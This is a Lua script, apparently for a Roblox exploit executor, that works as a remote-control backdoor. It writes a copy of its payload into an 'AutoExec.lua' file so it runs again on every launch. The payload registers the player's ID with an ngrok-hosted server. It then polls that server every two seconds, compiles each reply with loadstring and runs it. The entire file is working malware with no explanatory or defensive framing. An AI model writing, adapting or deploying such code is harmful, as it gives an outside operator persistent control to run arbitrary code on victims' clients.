local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local userId = tostring(localPlayer.UserId)
local servidor = "https://witty-basilisk-eminent.ngrok-free.app"
local arquivoAutoExec = "AutoExec.lua"

local scriptCompleto = [[
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local userId = tostring(localPlayer.UserId)
local servidor = "]] .. servidor .. [["

local function registrarJogador()
    pcall(function()
        game:HttpGet(servidor .. "/entrada?id=" .. HttpService:UrlEncode(userId) .. "&t=" .. tick())
    end)
end

local function pegarComando()
    local success, resposta = pcall(function()
        return game:HttpGet(servidor .. "/comando/" .. userId .. "?t=" .. tick())
    end)
    if success and resposta and resposta ~= "" then
        local func = loadstring(resposta)
        if func then pcall(func) end
    end
end

registrarJogador()

spawn(function()
    while true do
        if localPlayer and localPlayer.Parent then
            pegarComando()
        else
            break
        end
        task.wait(2)
    end
end)

localPlayer.CharacterAdded:Connect(function()
    task.wait(2)
    registrarJogador()
end)
]]

local function estaNoAutoExec()
    local info = debug.getinfo(1, "S").source
    return info:lower():find("autoexec") ~= nil
end

local function replicarAutoExec()
    if writefile then
        writefile(arquivoAutoExec, scriptCompleto)
    end
end

if not estaNoAutoExec() then
    replicarAutoExec()
else
    loadstring(scriptCompleto)()
end
